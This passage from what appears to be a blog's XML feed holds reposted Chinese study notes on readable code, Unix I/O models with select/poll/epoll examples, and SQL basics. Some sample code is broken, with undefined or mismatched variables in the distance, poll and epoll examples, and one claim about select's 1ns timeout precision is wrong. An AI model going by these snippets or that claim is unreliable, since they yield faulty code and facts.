add(1, 2), return 3int add(int x, int y) &#123; return x + y;&#125; 使用专业名词来缩短概念上的解释，比如用设计模式名来说明代码。 七、提高控制流的可读性条件表达式中，左侧是变量，右侧是常数。比如下面第一个语句正确： 12if (len &lt; 10)if (10 &gt; len) 只有在逻辑简单的情况下使用 ? : 三目运算符来使代码更紧凑，否则应该拆分成 if / else； do / while 的条件放在后面，不够简单明了，并且会有一些迷惑的地方，最好使用 while 来代替。 如果只有一个 goto 目标，那么 goto 尚且还能接受，但是过于复杂的 goto 会让代码可读性特别差，应该避免使用 goto。 在嵌套的循环中，用一些 return 语句往往能减少嵌套的层数。 八、拆分长表达式长表达式的可读性很差，可以引入一些解释变量从而拆分表达式： 12if line.split(':')[0].strip() == "root": ... 123username = line.split(':')[0].strip()if username == "root": ... 使用摩根定理简化一些逻辑表达式： 123if (!a &amp;&amp; !b) &#123; ...&#125; 123if (!(a || b)) &#123; ...&#125; 九、变量与可读性去除控制流变量 。在循环中通过使用 break 或者 return 可以减少控制流变量的使用。 12345678boolean done = false;while (/* condition */ &amp;&amp; !done) &#123; ... if ( ... ) &#123; done = true; continue; &#125;&#125; 123456while(/* condition */) &#123; ... if ( ... ) &#123; break; &#125;&#125; 减小变量作用域 。作用域越小，越容易定位到变量所有使用的地方。 JavaScript 可以用闭包减小作用域。以下代码中 submit_form 是函数变量，submitted 变量控制函数不会被提交两次。第一个实现中 submitted 是全局变量，第二个实现把 submitted 放到匿名函数中，从而限制了起作用域范围。 1234567submitted = false;var submit_form = function(form_name) &#123; if (submitted) &#123; return; &#125; submitted = true;&#125;; 123456789var submit_form = (function() &#123; var submitted = false; return function(form_name) &#123; if(submitted) &#123; return; &#125; submitted = true; &#125;&#125;()); // () 使得外层匿名函数立即执行 JavaScript 中没有用 var 声明的变量都是全局变量，而全局变量很容易造成迷惑，因此应当总是用 var 来声明变量。 变量定义的位置应当离它使用的位置最近。 实例解析 在一个网页中有以下文本输入字段： 1234&lt;input type = "text" id = "input1" value = "a"&gt;&lt;input type = "text" id = "input2" value = "b"&gt;&lt;input type = "text" id = "input3" value = ""&gt;&lt;input type = "text" id = "input4" value = "d"&gt; 现在要接受一个字符串并把它放到第一个空的 input 字段中，初始实现如下： 123456789101112131415var setFirstEmptyInput = function(new_alue) &#123; var found = false; var i = 1; var elem = document.getElementById('input' + i); while (elem != null) &#123; if (elem.value === '') &#123; found = true; break; &#125; i++; elem = document.getElementById('input' + i); &#125; if (found) elem.value = new_value; return elem;&#125; 以上实现有以下问题： found 可以去除； elem 作用域过大； 可以用 for 循环代替 while 循环； 123456789101112var setFirstEmptyInput = function(new_value) &#123; for (var i = 1; true; i++) &#123; var elem = document.getElementById('input' + i); if (elem === null) &#123; return null; &#125; if (elem.value === '') &#123; elem.value = new_value; return elem; &#125; &#125;&#125;; 十、抽取函数工程学就是把大问题拆分成小问题再把这些问题的解决方案放回一起。 首先应该明确一个函数的高层次目标，然后对于不是直接为了这个目标工作的代码，抽取出来放到独立的函数中。 介绍性的代码： 12345678910111213141516int findClostElement(int[] arr) &#123; int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i &lt; arr.length; i++) &#123; int x = ...; int y = ...; int z = ...; int value = x * y * z; int dist = Math.sqrt(Math.pow(value, 2), Math.pow(arr[i], 2)); if (dist &lt; clostDist) &#123; clostIdx = i; clostDist = value; &#125; &#125; return clostIdx;&#125; 以上代码中循环部分主要计算距离，这部分不属于代码高层次目标，高层次目标是寻找最小距离的值，因此可以把这部分代替提取到独立的函数中。这样做也带来一个额外的好处有：可以单独进行测试、可以快速找到程序错误并修改。 123456789101112public int findClostElement(int[] arr) &#123; int clostIdx; int clostDist = Interger.MAX_VALUE; for (int i = 0; i &lt; arr.length; i++) &#123; int dist = computDist(arr, i); if (dist &lt; clostDist) &#123; clostIdx = i; clostDist = value; &#125; &#125; return clostIdx;&#125; 并不是函数抽取的越多越好，如果抽取过多，在阅读代码的时候可能需要不断跳来跳去。只有在当前函数不需要去了解某一块代码细节而能够表达其内容时，把这块代码抽取成子函数才是好的。 函数抽取也用于减小代码的冗余。 十一、一次只做一件事只做一件事的代码很容易让人知道其要做的事； 基本流程：列出代码所做的所有任务；把每个任务拆分到不同的函数，或者不同的段落。 十二、用自然语言表述代码先用自然语言书写代码逻辑，也就是伪代码，然后再写代码，这样代码逻辑会更清晰。 十三、减少代码量不要过度设计，编码过程会有很多变化，过度设计的内容到最后往往是无用的。 多用标准库实现。 参考资料 Dustin, Boswell, Trevor, 等. 编写可读代码的艺术 [M]. 机械工业出版社, 2012.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Socket]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FSocket%2F</url>
    <content type="text"><![CDATA[一、I/O 模型 阻塞式 I/O 非阻塞式 I/O I/O 复用 信号驱动 I/O 异步 I/O 同步 I/O 与异步 I/O 五大 I/O 模型比较 二、I/O 复用 select poll epoll select 和 poll 比较 epoll 工作模式 应用场景 参考资料 一、I/O 模型一个输入操作通常包括两个阶段： 等待数据准备好 从内核向进程复制数据 对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待分组到达时，它被复制到内核中的某个缓冲区。第二步就是把数据从内核缓冲区复制到应用进程缓冲区。 Unix 下有五种 I/O 模型： 阻塞式 I/O 非阻塞式 I/O I/O 复用（select 和 poll） 信号驱动式 I/O（SIGIO） 异步 I/O（AIO） 阻塞式 I/O应用进程被阻塞，直到数据复制到应用进程缓冲区中才返回。 应该注意到，在阻塞的过程中，其它程序还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其他程序还可以执行，因此不消耗 CPU 时间，这种模型的执行效率会比较高。 下图中，recvfrom 用于接收 Socket 传来的数据，并复制到应用进程的缓冲区 buf 中。这里把 recvfrom() 当成系统调用。 1ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen); 非阻塞式 I/O应用进程执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不断的执行系统调用来获知 I/O 是否完成，这种方式称为轮询（polling）。 由于 CPU 要处理更多的系统调用，因此这种模型是比较低效的。 I/O 复用使用 select 或者 poll 等待数据，并且可以等待多个套接字中的任何一个变为可读，这一过程会被阻塞，当某一个套接字可读时返回。之后再使用 recvfrom 把数据从内核复制到进程中。 它可以让单个进程具有处理多个 I/O 事件的能力。又被称为 Event Driven I/O，即事件驱动 I/O。 如果一个 Web 服务器没有 I/O 复用，那么每一个 Socket 连接都需要创建一个线程去处理。如果同时有几万个连接，那么就需要创建相同数量的线程。并且相比于多进程和多线程技术，I/O 复用不需要进程线程创建和切换的开销，系统开销更小。 信号驱动 I/O应用进程使用 sigaction 系统调用，内核立即返回，应用进程可以继续执行，也就是说等待数据阶段应用进程是非阻塞的。内核在数据到达时向应用进程发送 SIGIO 信号，应用进程收到之后在信号处理程序中调用 recvfrom 将数据从内核复制到应用进程中。 相比于非阻塞式 I/O 的轮询方式，信号驱动 I/O 的 CPU 利用率更高。 异步 I/O进行 aio_read 系统调用会立即返回，应用进程继续执行，不会被阻塞，内核会在所有操作完成之后向应用进程发送信号。 异步 I/O 与信号驱动 I/O 的区别在于，异步 I/O 的信号是通知应用进程 I/O 完成，而信号驱动 I/O 的信号是通知应用进程可以开始 I/O。 同步 I/O 与异步 I/O 同步 I/O：应用进程在调用 recvfrom 操作时会阻塞。 异步 I/O：不会阻塞。 阻塞式 I/O、非阻塞式 I/O、I/O 复用和信号驱动 I/O 都是同步 I/O，虽然非阻塞式 I/O 和信号驱动 I/O 在等待数据阶段不会阻塞，但是在之后的将数据从内核复制到应用进程这个操作会阻塞。 五大 I/O 模型比较前四种 I/O 模型的主要区别在于第一个阶段，而第二个阶段是一样的：将数据从内核复制到应用进程过程中，应用进程会被阻塞。 二、I/O 复用select/poll/epoll 都是 I/O 多路复用的具体实现，select 出现的最早，之后是 poll，再是 epoll。 select1int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); readset, writeset, exceptset 参数，分别对应读、写、异常条件的描述符集合。 timeout 参数告知内核等待所指定描述符中的任何一个就绪的最长时间； 成功调用返回结果大于 0；出错返回结果为 -1；超时返回结果为 0。 每次调用 select 都需要将 readfds, writefds, exceptfds 链表内容全部从应用进程缓冲区复制到内核缓冲区。 返回结果中内核并没有声明 fd_set 中哪些描述符已经准备好，所以如果返回值大于 0 时，应用进程需要遍历所有的 fd_set。 select 最多支持 1024 个描述符，其中 1024 由内核的 FD_SETSIZE 决定。如果需要打破该限制可以修改 FD_SETSIZE，然后重新编译内核。 123456789101112131415161718192021222324252627282930313233343536fd_set fd_in, fd_out;struct timeval tv;// Reset the setsFD_ZERO( &amp;fd_in );FD_ZERO( &amp;fd_out );// Monitor sock1 for input eventsFD_SET( sock1, &amp;fd_in );// Monitor sock2 for output eventsFD_SET( sock2, &amp;fd_out );// Find out which socket has the largest numeric value as select requires itint largest_sock = sock1 &gt; sock2 ? sock1 : sock2;// Wait up to 10 secondstv.tv_sec = 10;tv.tv_usec = 0;// Call the selectint ret = select( largest_sock + 1, &amp;fd_in, &amp;fd_out, NULL, &amp;tv );// Check if select actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; if ( FD_ISSET( sock1, &amp;fd_in ) ) // input event on sock1 if ( FD_ISSET( sock2, &amp;fd_out ) ) // output event on sock2&#125; poll1int poll(struct pollfd *fds, unsigned int nfds, int timeout); 12345struct pollfd &#123; int fd; // 文件描述符 short events; // 监视的请求事件 short revents; // 已发生的事件&#125;; 它和 select 功能基本相同，同样需要每次都将描述符从应用进程缓冲区复制到内核缓冲区，调用返回后同样需要进行轮询才能知道哪些描述符已经准备好。 poll 取消了 1024 个描述符数量上限，但是数量太大以后不能保证执行效率，因为复制大量内存到内核十分低效，所需时间与描述符数量成正比。 poll 在描述符的重复利用上比 select 的 fd_set 会更好。 如果在多线程下，如果一个线程对某个描述符调用了 poll 系统调用，但是另一个线程关闭了该描述符，会导致 poll 调用结果不确定，该问题同样出现在 select 中。 1234567891011121314151617181920212223242526272829// The structure for two eventsstruct pollfd fds[2];// Monitor sock1 for inputfds[0].fd = sock1;fds[0].events = POLLIN;// Monitor sock2 for outputfds[1].fd = sock2;fds[1].events = POLLOUT;// Wait 10 secondsint ret = poll( &amp;fds, 2, 10000 );// Check if poll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // If we detect the event, zero it out so we can reuse the structure if ( pfd[0].revents &amp; POLLIN ) pfd[0].revents = 0; // input event on sock1 if ( pfd[1].revents &amp; POLLOUT ) pfd[1].revents = 0; // output event on sock2&#125; epoll123int epoll_create(int size);int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event)；int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout); epoll 仅适用于 Linux OS。 它是 select 和 poll 的增强版，更加灵活而且没有描述符数量限制。 它将用户关心的描述符放到内核的一个事件表中，从而只需要在用户进程缓冲区和内核缓冲区拷贝一次。 select 和 poll 方式中，进程只有在调用一定的方法后，内核才对所有监视的描述符进行扫描。而 epoll 事先通过 epoll_ctl() 来注册描述符，一旦基于某个描述符就绪时，内核会采用类似 callback 的回调机制，迅速激活这个描述符，当进程调用 epoll_wait() 时便得到通知。 新版本的 epoll_create(int size) 参数 size 不起任何作用，在旧版本的 epoll 中如果描述符的数量大于 size，不保证服务质量。 epoll_ctl() 执行一次系统调用，用于向内核注册新的描述符或者是改变某个文件描述符的状态。已注册的描述符在内核中会被维护在一棵红黑树上，通过回调函数内核会将 I/O 准备好的描述符加入到一个链表中管理。 epoll_wait() 取出在内核中通过链表维护的 I/O 准备好的描述符，将他们从内核复制到应用进程中，不需要像 select/poll 对注册的所有描述符遍历一遍。 epoll 对多线程编程更有友好，同时多个线程对同一个描述符调用了 epoll_wait() 也不会产生像 select/poll 的不确定情况。或者一个线程调用了 epoll_wait() 另一个线程关闭了同一个描述符也不会产生不确定情况。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.// The function argument is ignored (it was not before, but now it is), so put your favorite number hereint pollingfd = epoll_create( 0xCAFE );if ( pollingfd &lt; 0 ) // report error// Initialize the epoll structure in case more members are added in futurestruct epoll_event ev = &#123; 0 &#125;;// Associate the connection class instance with the event. You can associate anything// you want, epoll does not use this information. We store a connection class pointer, pConnection1ev.data.ptr = pConnection1;// Monitor for input, and do not automatically rearm the descriptor after the eventev.events = EPOLLIN | EPOLLONESHOT;// Add the descriptor into the monitoring list. We can do it even if another thread is// waiting in epoll_wait - the descriptor will be properly addedif ( epoll_ctl( epollfd, EPOLL_CTL_ADD, pConnection1-&gt;getSocket(), &amp;ev ) != 0 ) // report error// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)struct epoll_event pevents[ 20 ];// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event arrayint ready = epoll_wait( pollingfd, pevents, 20, 10000 );// Check if epoll actually succeedif ( ret == -1 ) // report error and abortelse if ( ret == 0 ) // timeout; no event detectedelse&#123; // Check if any events detected for ( int i = 0; i &lt; ret; i++ ) &#123; if ( pevents[i].events &amp; EPOLLIN ) &#123; // Get back our connection pointer Connection * c = (Connection*) pevents[i].data.ptr; c-&gt;handleReadEvent(); &#125; &#125;&#125; select 和 poll 比较1. 功能它们提供了几乎相同的功能，但是在一些细节上有所不同： select 会修改 fd_set 参数，而 poll 不会； select 默认只能监听 1024 个描述符，如果要监听更多的话，需要修改 FD_SETSIZE 之后重新编译； poll 提供了更多的事件类型。 2. 速度poll 和 select 在速度上都很慢。 它们都采取轮询的方式来找到 I/O 完成的描述符，如果描述符很多，那么速度就会很慢； select 只使用每个描述符的 3 位，而 poll 通常需要使用 64 位，因此 poll 需要在用户进程和内核之间复制更多的数据。 3. 可移植性几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。 epoll 工作模式epoll_event 有两种触发模式：LT（level trigger）和 ET（edge trigger）。 1. LT 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序可以不立即处理该事件。下次调用 epoll_wait() 时，会再次响应应用程序并通知此事件。是默认的一种模式，并且同时支持 Blocking 和 No-Blocking。 2. ET 模式当 epoll_wait() 检测到描述符事件发生并将此事件通知应用程序，应用程序必须立即处理该事件。如果不处理，下次调用 epoll_wait() 时，不会再次响应应用程序并通知此事件。很大程度上减少了 epoll 事件被重复触发的次数，因此效率要比 LT 模式高。只支持 No-Blocking，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。 应用场景很容易产生一种错觉认为只要用 epoll 就可以了，select poll 都是历史遗留问题，并没有什么应用场景，其实并不是这样的。 1. select 应用场景select() poll() epoll_wait() 都有一个 timeout 参数，在 select() 中 timeout 的精确度为 1ns，而 poll() 和 epoll_wait() 中则为 1ms。所以 select 更加适用于实时要求更高的场景，比如核反应堆的控制。 select 历史更加悠久，它的可移植性更好，几乎被所有主流平台所支持。 2. poll 应用场景poll 没有最大描述符数量的限制，如果平台支持应该采用 poll 且对实时性要求并不是十分严格，而不是 select。 需要同时监控小于 1000 个描述符。没有必要使用 epoll，因为这个应用场景下并不能体现 epoll 的优势。 需要监控的描述符状态变化多，而且都是非常短暂的。因为 epoll 中的所有描述符都存储在内核中，造成每次需要对描述符的状态改变都需要通过 epoll_ctl() 进行系统调用，频繁系统调用降低效率。并且epoll 的描述符存储在内核，不容易调试。 3. epoll 应用场景程序只需要运行在 Linux 平台上，有非常大量的描述符需要同时轮询，而且这些连接最好是长连接。 4. 性能对比epoll Scalability Web Page 参考资料 Stevens W R, Fenner B, Rudoff A M. UNIX network programming[M]. Addison-Wesley Professional, 2004. Boost application performance using asynchronous I/O Synchronous and Asynchronous I/O.aspx) Linux IO 模式及 select、poll、epoll 详解 poll vs select vs event-based]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FSQL%2F</url>
    <content type="text"><![CDATA[一、基础 二、创建表 三、修改表 四、插入 五、更新 六、删除 七、查询 八、排序 九、过滤 十、通配符 十一、计算字段 十二、函数 十三、分组 十四、子查询 十五、连接 十六、组合查询 十七、视图 十八、存储过程 十九、游标 二十、触发器 二十一、事务处理 二十二、字符集 二十三、权限管理 参考资料 一、基础模式定义了数据如何存储、存储什么样的数据以及数据如何分解等信息，数据库和表都有模式。 主键的值不允许修改，也不允许复用（不能使用已经删除的主键值赋给新数据行的主键）。 SQL（Structured Query Language)，标准 SQL 由 ANSI 标准委员会管理，从而称为 ANSI SQL。各个 DBMS 都有自己的实现，如 PL/SQL、Transact-SQL 等。 SQL 语句不区分大小写，但是数据库表名、列名和值是否区分依赖于具体的 DBMS 以及配置。 SQL 支持以下三种注释： 12345# 注释SELECT *FROM mytable; -- 注释/* 注释1 注释2 */ 数据库创建与使用： 12CREATE DATABASE test;USE test; 二、创建表123456CREATE TABLE mytable ( id INT NOT NULL AUTO_INCREMENT, col1 INT NOT NULL DEFAULT 1, col2 VARCHAR(45) NULL, col3 DATE NULL, PRIMARY KEY (`id`)); 三、修改表添加列 12ALTER TABLE mytableADD col CHAR(20); 删除列 12ALTER TABLE mytableDROP COLUMN col; 删除表 1DROP TABLE mytable; 四、插入普通插入 12INSERT INTO mytable(col1, col2)VALUES(val1, val2); 插入检索出来的数据 123INSERT INTO mytable1(col1, col2)SELECT col1, col2FROM mytable2; 将一个表的内容插入到一个新表 12CREATE TABLE newtable ASSELECT * FROM mytable; 五、更新123UPDATE mytableSET col = valWHERE id = 1; 六、删除12DELETE FROM mytableWHERE id = 1; TRUNCATE TABLE 可以清空表，也就是删除所有行。 1TRUNCATE TABLE mytable; 使用更新和删除操作时一定要用 WHERE 子句，不然会把整张表的数据都破坏。可以先用 SELECT 语句进行测试，防止错误删除。 七、查询DISTINCT相同值只会出现一次。它作用于所有列，也就是说所有列的值都相同才算相同。 12SELECT DISTINCT col1, col2FROM mytable; LIMIT限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。 返回前 5 行： 123SELECT *FROM mytableLIMIT 5; 123SELECT *FROM mytableLIMIT 0, 5; 返回第 3 ~ 5 行： 123SELECT *FROM mytableLIMIT 2, 3; 八、排序 ASC ：升序（默认） DESC ：降序 可以按多个列进行排序，并且为每个列指定不同的排序方式： 123SELECT *FROM mytableORDER BY col1 DESC, col2 ASC; 九、过滤不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。 123SELECT *FROM mytableWHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符 操作符 说明 = 等于 &lt; 小于 &gt; 大于 &lt;&gt; != 不等于 &lt;= !&gt; 小于等于 &gt;= !&lt; 大于等于 BETWEEN 在两个值之间 IS NULL 为 NULL 值 应该注意到，NULL 与 0、空字符串都不同。 AND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。 IN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。 NOT 操作符用于否定一个条件。 十、通配符通配符也是用在过滤语句中，但它只能用于文本字段。 % 匹配 &gt;=0 个任意字符； _ 匹配 ==1 个任意字符； [ ] 可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。 使用 Like 来进行通配符匹配。 123SELECT *FROM mytableWHERE col LIKE '[^AB]%'; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。 十一、计算字段在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。 计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。 12SELECT col1 * col2 AS aliasFROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。 12SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_colFROM mytable; 十二、函数各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。 汇总 函 数 说 明 AVG() 返回某列的平均值 COUNT() 返回某列的行数 MAX() 返回某列的最大值 MIN() 返回某列的最小值 SUM() 返回某列值之和 AVG() 会忽略 NULL 行。 使用 DISTINCT 可以让汇总函数值汇总不同的值。 12SELECT AVG(DISTINCT col1) AS avg_colFROM mytable; 文本处理 函数 说明 LEFT() 左边的字符 RIGHT() 右边的字符 LOWER() 转换为小写字符 UPPER() 转换为大写字符 LTRIM() 去除左边的空格 RTRIM() 去除右边的空格 LENGTH() 长度 SOUNDEX() 转换为语音值 其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。 123SELECT *FROM mytableWHERE SOUNDEX(col1) = SOUNDEX('apple') 日期和时间处理 日期格式：YYYY-MM-DD 时间格式：HH:MM:SS 函 数 说 明 AddDate() 增加一个日期（天、周等） AddTime() 增加一个时间（时、分等） CurDate() 返回当前日期 CurTime() 返回当前时间 Date() 返回日期时间的日期部分 DateDiff() 计算两个日期之差 Date_Add() 高度灵活的日期运算函数 Date_Format() 返回一个格式化的日期或时间串 Day() 返回一个日期的天数部分 DayOfWeek() 对于一个日期，返回对应的星期几 Hour() 返回一个时间的小时部分 Minute() 返回一个时间的分钟部分 Month() 返回一个日期的月份部分 Now() 返回当前日期和时间 Second() 返回一个时间的秒部分 Time() 返回一个日期时间的时间部分 Year() 返回一个日期的年份部分 1mysql&gt; SELECT NOW(); 12018-4-14 20:25:11 数值处理 函数 说明 SIN() 正弦 COS() 余弦 TAN() 正切 ABS() 绝对值 SQRT() 平方根 MOD() 余数 EXP() 指数 PI() 圆周率 RAND() 随机数 十三、分组分组就是把具有相同的数据值的行放在同一组中。 可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。 指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。 123SELECT col, COUNT(*) AS numFROM mytableGROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。 1234SELECT col, COUNT(*) AS numFROM mytableGROUP BY colORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。 12345SELECT col, COUNT(*) AS numFROM mytableWHERE col &gt; 2GROUP BY colHAVING num &gt;= 2; 分组规定： GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。 十四、子查询子查询中只能返回一个字段的数据。 可以将子查询的结果作为 WHRER 语句的过滤条件： 1234SELECT *FROM mytable1WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次： 123456SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_numFROM CustomersORDER BY cust_name; 十五、连接连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。 连接可以替换子查询，并且比子查询的效率一般会更快。 可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。 内连接内连接又称等值连接，使用 INNER JOIN 关键字。 123SELECT A.value, B.valueFROM tablea AS A INNER JOIN tableb AS BON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。 123SELECT A.value, B.valueFROM tablea AS A, tableb AS BWHERE A.key = B.key; 在没有条件语句的情况下返回笛卡尔积。 自连接自连接可以看成内连接的一种，只是连接的表是自身而已。 一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。 子查询版本 123456SELECT nameFROM employeeWHERE department = ( SELECT department FROM employee WHERE name = "Jim"); 自连接版本 1234SELECT e1.nameFROM employee AS e1 INNER JOIN employee AS e2ON e1.department = e2.department AND e2.name = "Jim"; 自然连接自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。 内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。 12SELECT A.value, B.valueFROM tablea AS A NATURAL JOIN tableb AS B; 外连接外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。 检索所有顾客的订单信息，包括还没有订单信息的顾客。 123SELECT Customers.cust_id, Orders.order_numFROM Customers LEFT OUTER JOIN OrdersON Customers.cust_id = Orders.cust_id; customers 表： cust_id cust_name 1 a 2 b 3 c orders 表： order_id cust_id 1 1 2 1 3 3 4 3 结果： cust_id cust_name order_id 1 a 1 1 a 2 3 c 3 3 c 4 2 b Null 十六、组合查询使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。 每个查询必须包含相同的列、表达式和聚集函数。 默认会去除相同行，如果需要保留相同行，使用 UNION ALL。 只能包含一个 ORDER BY 子句，并且必须位于语句的最后。 1234567SELECT colFROM mytableWHERE col = 1UNIONSELECT colFROM mytableWHERE col =2; 十七、视图视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。 对视图的操作和对普通表的操作一样。 视图具有如下好处： 简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。 1234CREATE VIEW myview ASSELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_colFROM mytableWHERE col5 = val; 十八、存储过程存储过程可以看成是对一系列 SQL 操作的批处理； 使用存储过程的好处： 代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。 命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。 包含 in、out 和 inout 三种参数。 给变量赋值都需要用 select into 语句。 每次只能给一个变量赋值，不支持集合的操作。 123456789101112delimiter //create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end //delimiter ; 12call myprocedure(@ret);select @ret; 十九、游标在存储过程中使用游标可以对一个结果集进行移动遍历。 游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。 使用游标的四个步骤： 声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标； 1234567891011121314151617181920delimiter //create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # 定义了一个 continue handler，当 sqlstate '02000' 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 二十、触发器触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。 触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。 INSERT 触发器包含一个名为 NEW 的虚拟表。 1234CREATE TRIGGER mytrigger AFTER INSERT ON mytableFOR EACH ROW SELECT NEW.col into @result;SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。 UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改地，而 OLD 是只读的。 MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。 二十一、事务处理基本术语： 事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。 不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。 MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。 通过设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。 如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。 1234567START TRANSACTION// ...SAVEPOINT delete1// ...ROLLBACK TO delete1// ...COMMIT 二十二、字符集基本术语： 字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。 除了给表指定字符集和校对外，也可以给列指定： 123CREATE TABLE mytable(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对： 123SELECT *FROM mytableORDER BY col COLLATE latin1_general_ci; 二十三、权限管理MySQL 的账户信息保存在 mysql 这个数据库中。 12USE mysql;SELECT user FROM user; 创建账户 1CREATE USER myuser IDENTIFIED BY 'mypassword'; 新创建的账户没有任何权限。 修改账户名 1RENAME myuser TO newuser; 删除账户 1DROP USER myuser; 